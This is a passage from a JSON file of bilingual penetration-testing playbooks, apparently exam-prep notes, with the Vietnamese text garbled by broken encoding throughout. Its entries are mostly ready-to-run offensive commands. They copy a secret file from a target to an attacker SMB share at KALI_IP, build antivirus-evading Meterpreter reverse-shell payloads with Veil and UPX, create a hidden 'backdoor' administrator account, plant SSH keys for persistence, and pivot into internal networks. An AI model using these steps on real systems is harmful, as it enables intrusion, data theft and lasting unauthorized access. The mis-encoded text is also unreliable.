      { "vi": "**Ch·∫°y SMB Server (Kali):**", "en": "**Run SMB Server (Kali):**", "command": "sudo impacket-smbserver -smb2support SHARE ." },
      { "vi": "**Upload t·ª´ Target (Windows - copy):**", "en": "**Upload from Target (Windows - copy):**", "command": "copy C:\\path\\to\\secret.txt \\\\KALI_IP\\SHARE\\secret.txt" }
    ],
    "related_knowledge_ids": ["file_transfer_smb_download", "impacket-smbserver", "copy", "unc_path"]
  },
  "playbook_45_fix_exploit_web_searchsploit": {
    "title": {
      "vi": "Playbook 45: S·ª≠a l·ªói Exploit Web (D√πng Searchsploit)",
      "en": "Playbook 45: Fixing Web Exploits (Using Searchsploit)"
    },
    "assumption": "ƒê√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c ·ª©ng d·ª•ng web v√† phi√™n b·∫£n. `searchsploit` t√¨m th·∫•y exploit script.",
    "objective": "Sao ch√©p, ph√¢n t√≠ch v√† s·ª≠a ƒë·ªïi exploit script t·ª´ Searchsploit ƒë·ªÉ ho·∫°t ƒë·ªông.",
    "tools": ["searchsploit", "python", "php", "perl", "curl", "text editor"],
    "phases": ["Exploitation"],
    "techniques": ["Exploit Modification", "Web Exploitation"],
    "targets": ["Web Application", "CMS"],
    "os": ["Any"],
    "tags": ["exploit", "fixing exploits", "web exploit", "searchsploit", "exploit modification", "python", "php"],
    "content": "## Playbook 45: S·ª≠a l·ªói Exploit Web (D√πng Searchsploit) üîßüåê‚û°Ô∏èüí•\n\n**Gi·∫£ ƒë·ªãnh:** T√¨m th·∫•y exploit script tr√™n `searchsploit`.\n\n**M·ª•c ti√™u:** S·ª≠a ƒë·ªïi v√† ch·∫°y th√†nh c√¥ng exploit.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m & Sao ch√©p:** `searchsploit <App> <Ver>`, `searchsploit -m <id>`.\n2.  **ƒê·ªçc & Hi·ªÉu:** M·ªü script, hi·ªÉu l·ªó h·ªïng, tham s·ªë, h√†nh ƒë·ªông.\n3.  **S·ª≠a ƒë·ªïi:** Ch·ªânh URL, LHOST, LPORT, payload, ƒë∆∞·ªùng d·∫´n.\n4.  **Chu·∫©n b·ªã:** C√†i th∆∞ vi·ªán (`pip`), m·ªü listener (`nc`).\n5.  **Ch·∫°y Exploit:** `python exploit.py`.\n6.  **G·ª° l·ªói:** ƒê·ªçc l·ªói, th√™m `print`, so s√°nh request.",
    "steps": [
      { "vi": "**T√¨m Exploit:**", "en": "**Find Exploit:**", "command": "searchsploit <Application Name> <Version>" },
      { "vi": "**Sao ch√©p Exploit:**", "en": "**Mirror Exploit:**", "command": "searchsploit -m <exploit_id.py>" },
      { "vi": "**S·ª≠a ƒë·ªïi Exploit:**", "en": "**Modify Exploit:**", "command": "# Edit script: target_url, lhost, lport, payload, paths" },
      { "vi": "**M·ªü Listener (N·∫øu c·∫ßn):**", "en": "**Start Listener (If needed):**", "command": "rlwrap nc -lvnp 4444" },
      { "vi": "**Ch·∫°y Exploit:**", "en": "**Run Exploit:**", "command": "python exploit_id.py" }
    ],
    "related_knowledge_ids": ["fix_exploit_web_searchsploit", "searchsploit", "exploitation_finding_exploits_searchsploit", "python", "php", "perl", "curl", "nc"]
  },
  "playbook_46_av_evasion_veil": {
    "title": {
      "vi": "Playbook 46: AV Evasion d√πng Veil",
      "en": "Playbook 46: AV Evasion using Veil"
    },
    "assumption": "C·∫ßn t·∫°o payload bypass AV tr√™n Windows.",
    "objective": "S·ª≠ d·ª•ng Veil Framework ƒë·ªÉ t·∫°o payload t√πy ch·ªânh bypass AV.",
    "tools": ["veil", "msfconsole", "nc"],
    "phases": ["Exploitation", "Defense Evasion"],
    "techniques": ["AV Evasion", "Payload Generation", "Obfuscation"],
    "targets": ["Antivirus", "Windows"],
    "os": ["Windows", "Linux (Kali for generation)"],
    "tags": ["av evasion", "veil", "payload generation", "obfuscation", "bypass", "antivirus", "windows", "meterpreter", "reverse shell"],
    "content": "## Playbook 46: AV Evasion d√πng Veil üõ°Ô∏è‚û°Ô∏èüé≠‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** C·∫ßn payload bypass AV.\n\n**M·ª•c ti√™u:** T·∫°o payload bypass AV b·∫±ng Veil.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **C√†i & Ch·∫°y Veil (Kali):** `sudo apt install veil`, `/usr/share/veil/config/setup.sh`, `sudo veil`.\n2.  **Veil Evasion:** `use Evasion`, `list`, ch·ªçn payload (vd: `python/meterpreter/rev_tcp.py`), `set LHOST/LPORT`, `generate`.\n3.  **Chuy·ªÉn Payload:** T·∫£i file l√™n target.\n4.  **M·ªü Listener (MSF):** `use multi/handler`, `set PAYLOAD ...`, `run`.\n5.  **Th·ª±c thi Payload (Target).**",
    "steps": [
      { "vi": "**Ch·∫°y Veil (Kali):**", "en": "**Run Veil (Kali):**", "command": "sudo veil" },
      { "vi": "**Trong Veil Evasion:**", "en": "**Inside Veil Evasion:**", "command": "use Evasion -> list -> use <payload> -> set LHOST <kali_ip> -> set LPORT [PORT] -> generate" },
      { "vi": "**M·ªü Listener (Meterpreter):**", "en": "**Start Listener (Meterpreter):**", "command": "msfconsole -qx \"use multi/handler; set PAYLOAD <chosen_payload>; set LHOST <kali_ip>; set LPORT [PORT]; run\"" },
      { "vi": "**Chuy·ªÉn & Th·ª±c thi Payload (Windows):**", "en": "**Transfer & Execute Payload (Windows):**", "command": "# Transfer and run the generated payload" }
    ],
    "related_knowledge_ids": ["av_evasion_lab_capstone03_veil", "veil", "payload_generation", "obfuscation", "msfconsole", "multi_handler", "meterpreter", "reverse_shell", "file_transfer_http_upload"]
  },
  "playbook_47_postex_linux_persistence_sshkey": {
    "title": {
      "vi": "Playbook 47: Linux Post-Exploitation - Persistence qua SSH Key",
      "en": "Playbook 47: Linux Post-Exploitation - Persistence via SSH Key"
    },
    "assumption": "ƒê√£ c√≥ quy·ªÅn root ho·∫∑c quy·ªÅn ghi v√†o `~/.ssh` c·ªßa target user.",
    "objective": "Th√™m public key SSH v√†o `authorized_keys` ƒë·ªÉ ƒëƒÉng nh·∫≠p kh√¥ng c·∫ßn m·∫≠t kh·∫©u.",
    "tools": ["ssh-keygen", "echo", "mkdir", "chmod", "cat"],
    "phases": ["Post Exploitation", "Persistence"],
    "techniques": ["Persistence", "SSH Key Authentication"],
    "targets": ["Linux User Account", "~/.ssh/authorized_keys"],
    "os": ["Linux"],
    "tags": ["linux", "post exploitation", "persistence", "ssh key", "authorized_keys", "ssh-keygen", "chmod"],
    "content": "## Playbook 47: Linux Post-Ex - Persistence qua SSH Key üìåüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn root ho·∫∑c ghi v√†o `~/.ssh`.\n\n**M·ª•c ti√™u:** Th√™m public key ƒë·ªÉ SSH kh√¥ng c·∫ßn pass.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **L·∫•y Public Key (Kali):** `cat ~/.ssh/id_rsa.pub`.\n2.  **Th√™m Key (Target):** `mkdir -p ~/.ssh; chmod 700 ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys`.\n3.  **Ki·ªÉm tra ƒêƒÉng nh·∫≠p (Kali):** `ssh -i ~/.ssh/id_rsa user@<target_ip>`.",
    "steps": [
      { "vi": "**L·∫•y Public Key (Kali):**", "en": "**Get Public Key (Kali):**", "command": "cat ~/.ssh/id_rsa.pub" },
      { "vi": "**T·∫°o th∆∞ m·ª•c .ssh (Target):**", "en": "**Create .ssh dir (Target):**", "command": "mkdir -p /home/<target_user>/.ssh; chmod 700 /home/<target_user>/.ssh" },
      { "vi": "**Th√™m Key (Target):**", "en": "**Add Key (Target):**", "command": "echo \"<public_key_string>\" >> /home/<target_user>/.ssh/authorized_keys" },
      { "vi": "**ƒê·∫∑t Quy·ªÅn (Target):**", "en": "**Set Permissions (Target):**", "command": "chmod 600 /home/<target_user>/.ssh/authorized_keys" },
      { "vi": "**Ki·ªÉm tra ƒêƒÉng nh·∫≠p (Kali):**", "en": "**Test Login (Kali):**", "command": "ssh -i ~/.ssh/id_rsa <target_user>@<target_ip>" }
    ],
    "related_knowledge_ids": ["add_ssh_public_key", "ssh-keygen", "echo", "mkdir", "chmod", "cat", "ssh"]
  },
  "playbook_48_windows_postex_add_user": {
    "title": {
      "vi": "Playbook 48: Windows Post-Exploitation - Persistence qua Th√™m User",
      "en": "Playbook 48: Windows Post-Exploitation - Persistence via Add User"
    },
    "assumption": "ƒê√£ c√≥ quy·ªÅn Administrator ho·∫∑c SYSTEM.",
    "objective": "T·∫°o user m·ªõi v·ªõi quy·ªÅn admin (v√† RDP) ƒë·ªÉ duy tr√¨ truy c·∫≠p.",
    "tools": ["net user", "net localgroup"],
    "phases": ["Post Exploitation", "Persistence"],
    "techniques": ["Persistence", "User Creation"],
    "targets": ["Windows Local Accounts"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "persistence", "add user", "net user", "net localgroup", "administrator", "rdp"],
    "content": "## Playbook 48: Windows Post-Ex - Persistence qua Th√™m User üìåüë§\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn Admin/SYSTEM.\n\n**M·ª•c ti√™u:** T·∫°o user m·ªõi v·ªõi quy·ªÅn Admin/RDP.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Th√™m User:** `net user <User> <Pass> /add`.\n2.  **Th√™m v√†o Admin Group:** `net localgroup Administrators <User> /add`.\n3.  **Th√™m v√†o RDP Group:** `net localgroup \"Remote Desktop Users\" <User> /add`.\n4.  **Ki·ªÉm tra:** `net user <User>`.",
    "steps": [
      { "vi": "**Th√™m User:**", "en": "**Add User:**", "command": "net user backdoor Passw0rd123! /add" },
      { "vi": "**Th√™m v√†o Admin Group:**", "en": "**Add to Admin Group:**", "command": "net localgroup Administrators backdoor /add" },
      { "vi": "**Th√™m v√†o RDP Group:**", "en": "**Add to RDP Group:**", "command": "net localgroup \"Remote Desktop Users\" backdoor /add" },
      { "vi": "**Ki·ªÉm tra User:**", "en": "**Check User:**", "command": "net user backdoor" }
    ],
    "related_knowledge_ids": ["add_user_windows", "net user", "net localgroup"]
  },
  "playbook_49_pivoting_ligolo": {
    "title": {
      "vi": "Playbook 49: Pivoting - Tunneling v·ªõi Ligolo-ng",
      "en": "Playbook 49: Pivoting - Tunneling with Ligolo-ng"
    },
    "assumption": "C√≥ shell tr√™n Box A (Pivot). C·∫ßn truy c·∫≠p m·∫°ng n·ªôi b·ªô c·ªßa Box A.",
    "objective": "Thi·∫øt l·∫≠p TUN interface gi·ªØa Kali v√† Box A b·∫±ng Ligolo-ng.",
    "tools": ["ligolo-ng (proxy, agent)", "ip"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Tunneling", "TUN Interface", "Routing"],
    "targets": ["Internal Network Subnet"],
    "os": ["Any"],
    "tags": ["pivoting", "ligolo-ng", "tunneling", "tun interface", "routing"],
    "content": "## Playbook 49: Pivoting - Tunneling v·ªõi Ligolo-ng üö∂‚Äç‚ôÇÔ∏èüöá‚û°Ô∏èüåç\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell tr√™n Box A (Pivot), c·∫ßn truy c·∫≠p m·∫°ng n·ªôi b·ªô.\n\n**M·ª•c ti√™u:** T·∫°o tunnel m·∫°ng b·∫±ng Ligolo-ng.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Kali:** T·∫°o TUN (`ip tuntap add ...`), ch·∫°y proxy (`./proxy -selfcert`).\n2.  **Target:** T·∫£i & ch·∫°y agent (`./agent -connect <kali_ip>:11601 -ignore-cert`).\n3.  **Kali (Console):** `session`, `use <id>`, `start`.\n4.  **Kali (Shell):** Th√™m route (`sudo ip route add <subnet> dev ligolo`).\n5.  **S·ª≠ d·ª•ng Tunnel:** `ping`, `nmap` v√†o IP n·ªôi b·ªô.",
    "steps": [
      { "vi": "**T·∫°o TUN Interface (Kali):**", "en": "**Create TUN Interface (Kali):**", "command": "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up" },
      { "vi": "**Ch·∫°y Ligolo Proxy (Kali):**", "en": "**Run Ligolo Proxy (Kali):**", "command": "./proxy -selfcert" },
      { "vi": "**Ch·∫°y Ligolo Agent (Pivot):**", "en": "**Run Ligolo Agent (Pivot):**", "command": "./agent -connect <kali_ip>:11601 -ignore-cert" },
      { "vi": "**K·∫øt n·ªëi & B·∫Øt ƒë·∫ßu Session (Ligolo Console):**", "en": "**Connect & Start Session (Ligolo Console):**", "command": "session -> use <id> -> start" },
      { "vi": "**Th√™m Route (Kali Shell):**", "en": "**Add Route (Kali Shell):**", "command": "sudo ip route add <Internal_Subnet> dev ligolo" },
      { "vi": "**Ki·ªÉm tra K·∫øt n·ªëi:**", "en": "**Test Connection:**", "command": "ping <Internal_Target_IP>" }
    ],
    "related_knowledge_ids": ["ligolo_ng_pivoting", "ip", "ping", "nmap"]
  },
  "playbook_50_metasploit_pivoting_autoroute": {
    "title": {
      "vi": "Playbook 50: Pivoting - Metasploit Autoroute & Socks Proxy",
      "en": "Playbook 50: Pivoting - Metasploit Autoroute & Socks Proxy"
    },
    "assumption": "C√≥ session Meterpreter tr√™n Box A (Pivot) trong Metasploit.",
    "objective": "S·ª≠ d·ª•ng Meterpreter v√† Metasploit ƒë·ªÉ ƒë·ªãnh tuy·∫øn v√†o m·∫°ng n·ªôi b·ªô v√†/ho·∫∑c t·∫°o SOCKS proxy.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Pivoting", "Routing", "SOCKS Proxy"],
    "targets": ["Internal Network Subnet"],
    "os": ["Any"],
    "tags": ["pivoting", "metasploit", "meterpreter", "autoroute", "socks proxy", "routing"],
    "content": "## Playbook 50: Pivoting - Metasploit Autoroute & Socks Proxy üö∂‚Äç‚ôÇÔ∏èüöá‚û°Ô∏èüåç (MSF)\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ session Meterpreter tr√™n Pivot.\n\n**M·ª•c ti√™u:** ƒê·ªãnh tuy·∫øn traffic qua Meterpreter.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ki·ªÉm tra M·∫°ng (Meterpreter):** `ipconfig`, `run autoroute -p`.\n2.  **Th√™m Route (Meterpreter):** `run autoroute -s <subnet>`.\n3.  **(T√πy ch·ªçn) SOCKS Proxy (MSF):** `use auxiliary/server/socks_proxy`, `set SRVPORT 9050`, `run -j`.\n4.  **S·ª≠ d·ª•ng Pivot:** Ch·∫°y module MSF nh·∫Øm v√†o IP n·ªôi b·ªô (qua autoroute) ho·∫∑c d√πng `proxychains` (qua SOCKS).",
    "steps": [
      { "vi": "**Ki·ªÉm tra M·∫°ng (Meterpreter):**", "en": "**Check Network (Meterpreter):**", "command": "ipconfig" },
      { "vi": "**Th√™m Route (Meterpreter):**", "en": "**Add Route (Meterpreter):**", "command": "run autoroute -s <Internal_Subnet>" },
      { "vi": "**Ch·∫°y Module qua Route (MSF):**", "en": "**Run Module via Route (MSF):**", "command": "use auxiliary/scanner/portscan/tcp; set RHOSTS <Internal_IP>; run" },
      { "vi": "**T·∫°o SOCKS Proxy (MSF):**", "en": "**Create SOCKS Proxy (MSF):**", "command": "use auxiliary/server/socks_proxy; set SRVPORT 9050; run -j" },
      { "vi": "**D√πng SOCKS Proxy (Kali + Proxychains):**", "en": "**Use SOCKS Proxy (Kali + Proxychains):**", "command": "proxychains nmap -sT -p 80 -Pn <Internal_IP>" }
    ],
    "related_knowledge_ids": ["metasploit_pivoting", "metasploit", "meterpreter", "autoroute", "socks_proxy", "ipconfig", "nmap", "proxychains"]
  },
  "playbook_51_metasploit_portfwd": {
    "title": {
      "vi": "Playbook 51: Pivoting - Metasploit Meterpreter Port Forwarding",
      "en": "Playbook 51: Pivoting - Metasploit Meterpreter Port Forwarding"
    },
    "assumption": "C√≥ session Meterpreter tr√™n Box A (Pivot). C·∫ßn truy c·∫≠p c·ªïng c·ª• th·ªÉ tr√™n Box B t·ª´ Kali.",
    "objective": "S·ª≠ d·ª•ng l·ªánh `portfwd` c·ªßa Meterpreter ƒë·ªÉ chuy·ªÉn ti·∫øp c·ªïng.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Pivoting", "Port Forwarding"],
    "targets": ["Internal Network Service"],
    "os": ["Any"],
    "tags": ["pivoting", "metasploit", "meterpreter", "portfwd", "port forwarding"],
    "content": "## Playbook 51: Pivoting - Metasploit Port Forwarding üö∂‚Äç‚ôÇÔ∏èüîó‚û°Ô∏èüéØ (MSF)\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ session Meterpreter, c·∫ßn truy c·∫≠p `[Box_B_IP]:[Target_Port]` t·ª´ Kali.\n\n**M·ª•c ti√™u:** Forward c·ªïng target ra Kali b·∫±ng `portfwd`.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Thi·∫øt l·∫≠p (Meterpreter):** `portfwd add -l [Listen_Port_Kali] -p [Target_Port] -r [Box_B_IP]`.\n2.  **Truy c·∫≠p (Kali):** K·∫øt n·ªëi ƒë·∫øn `127.0.0.1:[Listen_Port_Kali]`.\n3.  **X√≥a (Meterpreter):** `portfwd delete ...`.",
    "steps": [
      { "vi": "**Th√™m Port Forward (Meterpreter):**", "en": "**Add Port Forward (Meterpreter):**", "command": "portfwd add -l [Listen_Port_Kali] -p [Target_Port] -r [Box_B_IP]" },
      { "vi": "**Xem Port Forwards (Meterpreter):**", "en": "**List Port Forwards (Meterpreter):**", "command": "portfwd list" },
      { "vi": "**Truy c·∫≠p t·ª´ Kali (V√≠ d·ª• RDP):**", "en": "**Access from Kali (Example RDP):**", "command": "xfreerdp /v:127.0.0.1:[Listen_Port_Kali] /u:user /p:pass" },
      { "vi": "**X√≥a Port Forward (Meterpreter):**", "en": "**Delete Port Forward (Meterpreter):**", "command": "portfwd delete -l [Listen_Port_Kali] -p [Target_Port] -r [Box_B_IP]" }
    ],
    "related_knowledge_ids": ["metasploit_pivoting", "metasploit", "meterpreter", "portfwd", "xfreerdp", "connect_rdp_xfreerdp"]
  },
  "playbook_52_av_evasion_packers": {
    "title": {
      "vi": "Playbook 52: AV Evasion d√πng Packers (UPX)",
      "en": "Playbook 52: AV Evasion using Packers (UPX)"
    },
    "assumption": "C√≥ payload .exe b·ªã AV ph√°t hi·ªán.",
    "objective": "S·ª≠ d·ª•ng UPX ƒë·ªÉ n√©n/ƒë√≥ng g√≥i file nh·∫±m bypass AV.",
    "tools": ["upx"],
    "phases": ["Defense Evasion"],
    "techniques": ["AV Evasion", "Packing"],
    "targets": ["Antivirus", "Windows Executable (PE)"],
    "os": ["Windows", "Linux (Kali for packing)"],
    "tags": ["av evasion", "packing", "upx", "bypass", "antivirus"],
    "content": "## Playbook 52: AV Evasion d√πng Packers (UPX) üõ°Ô∏èüì¶‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** Payload `.exe` g·ªëc b·ªã AV ch·∫∑n.\n\n**M·ª•c ti√™u:** D√πng UPX n√©n file ƒë·ªÉ bypass AV.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **C√†i UPX (Kali):** `sudo apt install upx-ucl -y`.\n2.  **ƒê√≥ng g√≥i:** `upx -9 -o packed.exe original.exe`.\n3.  **Ki·ªÉm tra (T√πy ch·ªçn):** VirusTotal.\n4.  **Chuy·ªÉn & Th·ª±c thi.**",
    "steps": [
      { "vi": "**C√†i UPX (Kali):**", "en": "**Install UPX (Kali):**", "command": "sudo apt install upx-ucl -y" },
      { "vi": "**ƒê√≥ng g√≥i Payload:**", "en": "**Pack Payload:**", "command": "upx -9 -o packed_payload.exe original_payload.exe" },
      { "vi": "**Chuy·ªÉn v√† Th·ª±c thi:**", "en": "**Transfer and Execute:**", "command": "# Transfer packed_payload.exe to target and run" }
    ],
    "related_knowledge_ids": ["av_evasion", "upx", "packing"]
  },
  "playbook_53_exploit_buffer_overflow_fix_badchars": {
    "title": {
      "vi": "Playbook 53: Exploit BOF - T√¨m v√† X·ª≠ l√Ω Bad Characters",
      "en": "Playbook 53: Exploit BOF - Finding and Handling Bad Characters"
    },
    "assumption": "ƒêang exploit BOF, ƒë√£ c√≥ EIP offset.",
    "objective": "X√°c ƒë·ªãnh c√°c byte (bad chars) l√†m h·ªèng payload v√† lo·∫°i b·ªè ch√∫ng.",
    "tools": ["python", "immunity debugger", "mona.py"],
    "phases": ["Exploitation", "Exploit Development"],
    "techniques": ["Buffer Overflow", "Bad Character Analysis"],
    "targets": ["Windows Application (32-bit)"],
    "os": ["Windows"],
    "tags": ["buffer overflow", "bof", "exploit dev", "bad characters", "immunity debugger", "mona"],
    "content": "## Playbook 53: Exploit BOF - T√¨m v√† X·ª≠ l√Ω Bad Chars üí•üö´‚û°Ô∏è‚úîÔ∏è\n\n**Gi·∫£ ƒë·ªãnh:** ƒêang exploit BOF, ƒë√£ c√≥ EIP offset.\n\n**M·ª•c ti√™u:** X√°c ƒë·ªãnh v√† lo·∫°i b·ªè bad characters.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T·∫°o Chu·ªói Bad Chars (Python):** `\\x01` ƒë·∫øn `\\xff` (b·ªè `\\x00`).\n2.  **G·ª≠i Payload Test:** `Junk + EIP(BBBB) + bad_chars`.\n3.  **Ph√¢n t√≠ch ESP Dump (Immunity):** Follow ESP, t√¨m byte b·ªã thi·∫øu/sai.\n4.  **L·∫∑p l·∫°i:** Lo·∫°i b·ªè bad char, g·ª≠i l·∫°i, ph√¢n t√≠ch l·∫°i.\n5.  **Ghi l·∫°i Bad Chars:** V√≠ d·ª•: `\\x00\\x0A\\x0D\\x2F`.\n6.  **S·ª≠ d·ª•ng trong Msfvenom:** `msfvenom ... -b '\\x00\\x0a...'`.",
    "steps": [
      { "vi": "**T·∫°o Chu·ªói Bad Chars:**", "en": "**Generate Bad Chars String:**", "command": "# Python loop from \\x01 to \\xff" },
      { "vi": "**G·ª≠i Payload Test:**", "en": "**Send Test Payload:**", "command": "# Python: junk + EIP + bad_chars_string" },
      { "vi": "**Ph√¢n t√≠ch ESP Dump (Immunity):**", "en": "**Analyze ESP Dump (Immunity):**", "command": "# Right-click ESP -> Follow in Dump. Look for missing/changed bytes." },
      { "vi": "**L·∫∑p l·∫°i Lo·∫°i b·ªè Bad Chars:**", "en": "**Repeat Removing Bad Chars:**", "command": "# Remove identified bad char, resend, re-analyze." },
      { "vi": "**Ghi l·∫°i Bad Chars:**", "en": "**Record Bad Chars:**", "command": "# Example: \\x00\\x0a\\x0d\\x2f" },
      { "vi": "**S·ª≠ d·ª•ng trong Msfvenom:**", "en": "**Use in Msfvenom:**", "command": "msfvenom ... -b '\\x00\\x0a\\x0d\\x2f'" }
    ],
    "related_knowledge_ids": ["buffer_overflow", "msfvenom", "python"]
  },
  "playbook_54_exploit_buffer_overflow_find_jmp_esp": {
    "title": {
      "vi": "Playbook 54: Exploit BOF - T√¨m JMP ESP (Mona)",
      "en": "Playbook 54: Exploit BOF - Finding JMP ESP (Mona)"
    },
    "assumption": "ƒêang exploit BOF, ƒë√£ c√≥ offset v√† bad chars.",
    "objective": "T√¨m ƒë·ªãa ch·ªâ `JMP ESP` trong module kh√¥ng c√≥ ASLR/DEP.",
    "tools": ["immunity debugger", "mona.py"],
    "phases": ["Exploitation", "Exploit Development"],
    "techniques": ["Buffer Overflow", "JMP ESP", "ASLR Bypass (Partial)", "DEP Bypass (Partial)"],
    "targets": ["Windows Application (32-bit)", "DLL Modules"],
    "os": ["Windows"],
    "tags": ["buffer overflow", "bof", "exploit dev", "jmp esp", "immunity debugger", "mona", "aslr", "dep"],
    "content": "## Playbook 54: Exploit BOF - T√¨m JMP ESP üí•‚û°Ô∏èü¶ò\n\n**Gi·∫£ ƒë·ªãnh:** ƒêang exploit BOF, ƒë√£ c√≥ offset v√† bad chars.\n\n**M·ª•c ti√™u:** T√¨m ƒë·ªãa ch·ªâ `JMP ESP` ƒë√°ng tin c·∫≠y.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Li·ªát k√™ Modules (Mona):** `!mona modules`. T√¨m module c√≥ ASLR/DEP = False.\n2.  **T√¨m JMP ESP (Mona):** `!mona find -s \"\\xff\\xe4\" -m <module.dll>`.\n3.  **Ch·ªçn ƒê·ªãa ch·ªâ:** Ch·ªçn ƒë·ªãa ch·ªâ kh√¥ng ch·ª©a bad chars.\n4.  **Chuy·ªÉn Little-Endian:** `0x1001B1C7` -> `\\xC7\\xB1\\x01\\x10`.\n5.  **S·ª≠ d·ª•ng:** Ghi ƒë√® EIP b·∫±ng ƒë·ªãa ch·ªâ Little-Endian n√†y.",
    "steps": [
      { "vi": "**Li·ªát k√™ Modules (Mona):**", "en": "**List Modules (Mona):**", "command": "!mona modules" },
      { "vi": "**T√¨m JMP ESP trong Module:**", "en": "**Find JMP ESP in Module:**", "command": "!mona find -s \"\\xff\\xe4\" -m <module_name.dll>" },
      { "vi": "**Ch·ªçn ƒê·ªãa ch·ªâ (Tr√°nh Bad Chars):**", "en": "**Choose Address (Avoid Bad Chars):**", "command": "# Select an address from the results" },
      { "vi": "**Chuy·ªÉn sang Little-Endian:**", "en": "**Convert to Little-Endian:**", "command": "# Example: 0x1001B1C7 -> \\xC7\\xB1\\x01\\x10" }
    ],
    "related_knowledge_ids": ["buffer_overflow", "mona.py", "jmp_esp", "aslr", "dep"]
  },
  "playbook_55_pivoting_sshuttle": {
    "title": {
      "vi": "Playbook 55: Pivoting - VPN \"Ngh√®o\" v·ªõi sshuttle",
      "en": "Playbook 55: Pivoting - \"Poor Man's\" VPN with sshuttle"
    },
    "assumption": "C√≥ root shell tr√™n Linux Box A (Pivot), Box A c√≥ Python3, c√≥ th·ªÉ SSH t·ª´ Kali v√†o Box A.",
    "objective": "Thi·∫øt l·∫≠p tunnel gi·ªëng VPN b·∫±ng sshuttle ƒë·ªÉ ƒë·ªãnh tuy·∫øn t·ª´ Kali v√†o m·∫°ng n·ªôi b·ªô c·ªßa Box A.",
    "tools": ["sshuttle", "ssh", "nmap"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Tunneling", "VPN", "Routing"],
    "targets": ["Internal Network Subnet"],
    "os": ["Linux"],
    "tags": ["pivoting", "sshuttle", "vpn", "tunneling", "routing", "ssh", "python3"],
    "content": "## Playbook 55: Pivoting - VPN \"Ngh√®o\" v·ªõi sshuttle üö∂‚Äç‚ôÇÔ∏èüöá‚û°Ô∏èüåç\n\n**Gi·∫£ ƒë·ªãnh:** Root shell tr√™n Pivot Linux, c√≥ Python3, SSH access t·ª´ Kali.\n\n**M·ª•c ti√™u:** T·∫°o tunnel VPN b·∫±ng sshuttle.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **C√†i sshuttle (Kali):** `sudo apt install sshuttle`.\n2.  **X√°c ƒë·ªãnh Subnet (Pivot):** `ip a`.\n3.  **Ch·∫°y sshuttle (Kali):** `sudo sshuttle --dns -r user@<Pivot_IP> <subnet1> <subnet2>`.\n4.  **S·ª≠ d·ª•ng Tunnel:** `ping`, `nmap` v√†o IP n·ªôi b·ªô.",
    "steps": [
      { "vi": "**C√†i sshuttle (Kali):**", "en": "**Install sshuttle (Kali):**", "command": "sudo apt install sshuttle -y" },
      { "vi": "**X√°c ƒë·ªãnh Subnets (Pivot):**", "en": "**Identify Subnets (Pivot):**", "command": "ip a" },
      { "vi": "**Ch·∫°y sshuttle (Kali):**", "en": "**Run sshuttle (Kali):**", "command": "sudo sshuttle --dns -r <user>@<Box_A_IP> <subnet1> <subnet2>" },
      { "vi": "**Ki·ªÉm tra K·∫øt n·ªëi:**", "en": "**Test Connection:**", "command": "ping <Internal_Target_IP>" }
    ],
    "related_knowledge_ids": ["ssh_tunnel_sshuttle", "sshuttle", "ssh", "ip", "ping", "nmap", "curl"]
  },
  "playbook_56_ad_enum_bloodhound_paths": {
    "title": {
      "vi": "Playbook 56: AD Enumeration - Ph√¢n t√≠ch ƒê∆∞·ªùng t·∫•n c√¥ng BloodHound",
      "en": "Playbook 56: AD Enumeration - Analyzing BloodHound Attack Paths"
    },
    "assumption": "ƒê√£ import d·ªØ li·ªáu SharpHound v√†o BloodHound GUI.",
    "objective": "S·ª≠ d·ª•ng BloodHound ƒë·ªÉ t√¨m ƒë∆∞·ªùng t·∫•n c√¥ng leo thang ƒë·∫∑c quy·ªÅn (v√≠ d·ª•: l√™n Domain Admins).",
    "tools": ["bloodhound", "sharphound"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration", "Attack Path Analysis", "Graph Theory"],
    "targets": ["Active Directory Domain", "Domain Admins"],
    "os": ["Any (BloodHound GUI)"],
    "tags": ["ad", "active directory", "bloodhound", "sharphound", "enumeration", "attack path", "visualization", "domain admin"],
